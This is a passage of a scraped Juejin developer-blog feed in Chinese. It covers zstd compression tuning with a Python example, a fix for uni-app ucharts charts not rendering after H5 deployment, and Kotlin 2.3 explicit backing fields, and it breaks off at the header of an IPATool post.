<li><strong>效果</strong>：专门用于处理<strong>极其庞大且有远距离重复</strong>的数据（如虚拟机镜像、相似度高的海量日志）。它可以在几百 MB 甚至 GB 之外寻找重复数据，而不受 <code>windowLog</code> 的内存限制。</li>
</ul>
<hr/>
<h2 data-id="heading-5">4. 典型场景参数组合与效果</h2>
<h3 data-id="heading-6">场景一：极速日志流 (Low Latency)</h3>
<ul>
<li><strong>组合</strong>：<code>Level 1</code> + <code>nbWorkers=0</code> (单线程减少开销) + <code>windowLog=10</code> (1KB 窗口)</li>
<li><strong>效果</strong>：极低的 CPU 占用，亚毫秒级延迟，适合吞吐量巨大的实时数据流。</li>
</ul>
<h3 data-id="heading-7">场景二：常规 Web 静态资源压缩</h3>
<ul>
<li><strong>组合</strong>：<code>Level 3</code> (默认) + <code>nbWorkers=4</code></li>
<li><strong>效果</strong>：在不明显拖慢构建速度的前提下，达到优于 Gzip 的压缩率。</li>
</ul>
<h3 data-id="heading-8">场景三：离线大数据存档 (Maximum Compression)</h3>
<ul>
<li><strong>组合</strong>：<code>Level 22</code> + <code>windowLog=27</code> (128MB) + <code>enableLDM=1</code> + <code>strategy=BTUltra2</code></li>
<li><strong>效果</strong>：压缩极其缓慢，但文件体积会达到惊人的小，适合一旦存入基本不动的数据。</li>
</ul>
<hr/>
<h2 data-id="heading-9">5. 代码示例 (Python 接口演示)</h2>
<p>虽然 C 是原生接口，但 Python 的 <code>zstandard</code> 库能更直观地展示参数组合。</p>
<p>Python</p>
<pre><code class="hljs language-ini" lang="ini">import zstandard as zstd

<span class="hljs-comment"># 模拟一份具有重复结构的大数据</span>
<span class="hljs-attr">data</span> = b<span class="hljs-string">"Welcome to ZSTD exploration! "</span> * <span class="hljs-number">10000</span> 

<span class="hljs-comment"># 1. 创建一个高性能压缩器：多线程 + 低等级</span>
<span class="hljs-attr">params_fast</span> = zstd.ZstdCompressionParameters.from_level(<span class="hljs-number">1</span>, threads=<span class="hljs-number">4</span>)
<span class="hljs-attr">cctx_fast</span> = zstd.ZstdCompressor(compression_params=params_fast)
<span class="hljs-attr">compressed_fast</span> = cctx_fast.compress(data)

<span class="hljs-comment"># 2. 创建一个极致压缩器：高等级 + 远程匹配 (LDM)</span>
<span class="hljs-comment"># 显式调整高级参数</span>
<span class="hljs-attr">params_ultra</span> = zstd.ZstdCompressionParameters(
    <span class="hljs-attr">compression_level</span>=<span class="hljs-number">22</span>,
    <span class="hljs-attr">enable_ldm</span>=<span class="hljs-literal">True</span>,           <span class="hljs-comment"># 开启长距离匹配</span>
    <span class="hljs-attr">window_log</span>=<span class="hljs-number">22</span>,             <span class="hljs-comment"># 4MB 窗口</span>
    <span class="hljs-attr">min_match</span>=<span class="hljs-number">3</span>,               <span class="hljs-comment"># 尽可能匹配短重复项</span>
    <span class="hljs-attr">strategy</span>=zstd.STRATEGY_BTULTRA2 <span class="hljs-comment"># 最强搜索策略</span>
)
<span class="hljs-attr">cctx_ultra</span> = zstd.ZstdCompressor(compression_params=params_ultra)
<span class="hljs-attr">compressed_ultra</span> = cctx_ultra.compress(data)

print(f"原始大小: {len(data) / 1024:.2f} KB")
print(f"快速模式大小: {len(compressed_fast) / 1024:.2f} KB")
print(f"极致模式大小: {len(compressed_ultra) / 1024:.2f} KB")
</code></pre>
<hr/>
<h2 data-id="heading-10">6. 使用建议与避坑指南</h2>
<ol>
<li><strong>内存占用计算</strong>：压缩时内存开销约为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>×</mo><msup><mn>2</mn><mrow><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>L</mi><mi>o</mi><mi>g</mi></mrow></msup></mrow><annotation encoding="application/x-tex">3 \times 2^{windowLog}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8491em;"/><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">in</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">L</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span></span></span></span></span></span></span></span></span>。如果将 <code>windowLog</code> 设为 31（2GB），单个压缩任务可能吃掉 6GB 内存。<strong>务必根据服务器规格限制 <code>windowLog</code></strong>。</li>
<li><strong>解压内存固定</strong>：ZSTD 最大的优势之一是<strong>解压内存恒定</strong>。解压时需要的内存仅等于压缩时设置的 <code>windowLog</code>。因此，即使压缩时用了 Level 22，只要窗口设得合理，手机端也能轻松解压。</li>
<li><strong>字典压缩 (Dictionary Compression)</strong> ：如果你在处理大量<strong>小数据</strong>（如 JSON API 响应，每个仅 1KB），参数调整的效果不如<strong>训练一个字典</strong>效果好。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app使用非uni_modules的ucharts组件，本地运行没问题，部署到线上出问题？]]></title>    <link>https://juejin.cn/post/7602996277663957046</link>    <guid>https://juejin.cn/post/7602996277663957046</guid>    <pubDate>2026-02-05T06:47:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602996277663957046" data-draft-id="7602921143490314283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app使用非uni_modules的ucharts组件，本地运行没问题，部署到线上出问题？"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-02-05T06:47:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="龙luckG前端"/> <meta itemprop="url" content="https://juejin.cn/user/1464996737332168"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app使用非uni_modules的ucharts组件，本地运行没问题，部署到线上出问题？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1464996737332168/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    龙luckG前端
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:47:06.000Z" title="Thu Feb 05 2026 06:47:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>问题背景</strong>：使用非uni_modules的ucharts组件，本地运行没用问题，发布为h5后未见报错，但ucharts却始终出不来。</p>
<p><strong>步骤复现</strong>：</p>
<ol>
<li>
<p>手上有个需求，需要使用uni-app开发微信小程序，初始时使用h5作为演示系统，需求里面存在图表展示功能。这时，网上去找对应适合的charts组件，发现ucharts可以用于移动端图表展示。</p>
</li>
<li>
<p>引入官方非uni_modules组件（官方有说明文档），进行开发。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d77bee669cd647f68289179135a52e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6ZbHVja0fliY3nq68=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770878826&amp;x-signature=2L3o6tk6MLUDntQSaXnXbN%2FbP1A%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p>按照步骤引入qiun-data-charts.vue组件后，本地运行可以正常出来，也没见报错，这时build为h5后发布到服务器，神奇的一幕出现了，charts竟然出不来！！！赶紧某度，甚至上了AI，但都没解决问题，后面我就琢磨是否配置有问题，比如opts或者eopts出问题了，但对比了一下官方api均未发现问题，只能去翻ucharts源码。</p>
</li>
<li>
<p>看了一下源码后发现有一段代码用到了<strong>路径</strong>，就怀疑是不是路径解析出了问题，加了个打印再次部署查看，发现果真多了个./ 然后去找了一下为什么会多出这个东西，原因是打包的时候配置了指定资源打包路径，<strong>重新修改ucharts资源路径</strong>之后就可以正常出来了。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ddcf8b67564485d940e96585d91ef90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6ZbHVja0fliY3nq68=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770878826&amp;x-signature=uBbQwb6%2FXiv5qELNtvFZMNRR2DE%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bf91a7f614a402badfd46e464e03d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6ZbHVja0fliY3nq68=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770878826&amp;x-signature=LEkPOe%2F7c21WSomnjVCbaeow%2FFI%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7e45b836ca045a6bb4d1658fa96ebc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6ZbHVja0fliY3nq68=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770878826&amp;x-signature=flu6ovR5FcCfgdE4tq0SRLD9C3A%3D" alt="image.png" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-0">以上内容仅供参考</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 2.3 告别冗余：深度解析“explicit backing fields”]]></title>    <link>https://juejin.cn/post/7602916406981689385</link>    <guid>https://juejin.cn/post/7602916406981689385</guid>    <pubDate>2026-02-05T06:48:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602916406981689385" data-draft-id="7602996277663842358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 2.3 告别冗余：深度解析“explicit backing fields”"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-02-05T06:48:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ehtan_Zheng"/> <meta itemprop="url" content="https://juejin.cn/user/413072099642478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 2.3 告别冗余：深度解析“explicit backing fields”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/413072099642478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ehtan_Zheng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:48:32.000Z" title="Thu Feb 05 2026 06:48:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Kotlin 2.3 引入了<strong>explicit backing fields</strong>，允许你用单个属性替换经典的 <code>_state</code> + <code>state</code> 模板代码，你的 ViewModel 将变得前所未有的清爽。</p>
<hr/>
<h2 data-id="heading-0">现状：被“下划线”统治的模板代码</h2>
<p>多年来，为了确保封装性，Android 开发者一直遵循着一种“标准仪式”：创建一个私有的 <code>MutableStateFlow</code> 用于内部修改，再暴露一个公有的 <code>StateFlow</code> 供外部读取。</p>
<h3 data-id="heading-1">“旧”方案（繁琐的样板代码）</h3>
<p>Kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 内部使用的可变状态</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _uiState = MutableStateFlow(UiState.Loading)

<span class="hljs-comment">// 暴露给外部的只读视图</span>
<span class="hljs-keyword">val</span> uiState: StateFlow&lt;UiState&gt; = _uiState.asStateFlow()
</code></pre>
<p>虽然这种做法行之有效，但它不仅让 IDE 的自动补全充满了各种带下划线的变量，还为每一个 ViewModel 增加了大量的变量定义。</p>
<hr/>
<h2 data-id="heading-2">显式幕后字段（Explicit Backing Fields）</h2>
<p>在 <strong>Kotlin 2.3</strong> 中，你现在可以在单个属性内部定义一个 <code>field</code> 块。这让你可以为属性定义<strong>特定的内部存储类型</strong>，同时对外界仅暴露<strong>只读的 API</strong>。</p>
<h3 data-id="heading-3">“新”方案（优雅的单属性）</h3>
<p>Kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfileViewModel</span> : <span class="hljs-type">ViewModel</span>() {

    <span class="hljs-comment">// 同一个属性名，两种不同的类型</span>
    <span class="hljs-keyword">val</span> uiState: StateFlow&lt;ProfileState&gt;
        field = MutableStateFlow(ProfileState.Loading) 

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateUsername</span><span class="hljs-params">(newName: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// 在类内部，'field' 让我们直接拥有可变的访问权限</span>
        field.value = ProfileState.Success(username = newName)
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-4">⚠️ 工程实践中的现实问题</h2>
<p>在你打算删掉项目中所有的下划线变量之前，有几个关键的工程细节需要你知晓：</p>
<ul>
<li><strong>只读 vs 不可变：</strong> <code>StateFlow</code> 或 <code>List</code> 只是<strong>只读视图</strong>，而非绝对不可变。虽然外部 API 没有提供修改工具，但底层的<strong>explicit backing fields</strong>依然是可变的。</li>
<li><strong>仅限简单初始化：</strong> <strong>explicit backing fields</strong>最适合简单的赋值。如果你的状态需要复杂的链式操作（如 <code>.stateIn()</code>）或者基于构造参数的复杂条件逻辑，传统的双属性方案依然更具灵活性。</li>
<li><strong>严格的实验性阶段：</strong> 该特性目前隐藏在 <code>-Xexplicit-backing-fields</code> 编译器参数之后。在当前版本的 Android Studio 中，语法高亮和重构支持可能还不够稳定。</li>
<li><strong>运行时安全缺口：</strong> 传统的 <code>_state.asStateFlow()</code> 模式会创建一个包装层，防止外部在运行时将其强转回 <code>MutableStateFlow</code>。<strong>explicit backing fields</strong>目前在底层并不天生具备这种“防强转”机制。</li>
</ul>
<hr/>
<h2 data-id="heading-5">总结</h2>
<p><strong>explicit backing fields</strong>让代码更加干净、紧凑。虽然目前它还处于实验阶段，但它代表了 Kotlin 消除样板代码、提升开发者幸福感的明确方向。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS——IPATool工具的使用]]></title>    <link>https://juejin.cn/post/7602894102993338378</link>    <guid>https://juejin.cn/post/7602894102993338378</guid>    <pubDate>2026-02-05T06:52:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602894102993338378" data-draft-id="7603160727716642867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS——IPATool工具的使用"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2026-02-05T06:52:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Haha_bj"/> <meta itemprop="url" content="https://juejin.cn/user/2612027844214647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS——IPATool工具的使用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612027844214647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Haha_bj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:52:02.000Z" title="Thu Feb 05 2026 06:52:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
